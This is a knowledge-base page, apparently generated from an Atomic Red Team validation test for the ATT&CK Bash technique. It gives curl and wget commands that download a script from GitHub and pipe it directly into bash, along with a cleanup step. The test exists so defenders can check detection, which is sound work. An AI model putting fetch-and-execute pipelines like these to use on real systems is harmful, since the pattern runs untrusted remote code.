---
atomic_guid: "d0c88567-803d-4dca-99b4-7ce65e7b257c"
title: "Command-Line Interface"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.004"
attack_technique_name: "Command and Scripting Interpreter: Bash"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.004/T1059.004.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "d0c88567-803d-4dca-99b4-7ce65e7b257c"
  - "Command-Line Interface"
platforms:
  - "linux"
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Command-Line Interface

Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.

Upon successful execution, sh will download via curl and wget the specified payload (echo-art-fish.sh) and set a marker file in `/tmp/art-fish.txt`.

## Metadata

- Atomic GUID: d0c88567-803d-4dca-99b4-7ce65e7b257c
- Technique: T1059.004: Command and Scripting Interpreter: Bash
- Platforms: linux, macos
- Executor: sh
- Source Path: atomics/T1059.004/T1059.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter|T1059.004]]

## Executor

- name: sh

### Command

```bash
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/echo-art-fish.sh | bash
```

### Cleanup

```bash
rm /tmp/art-fish.txt
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.004/T1059.004.yaml)
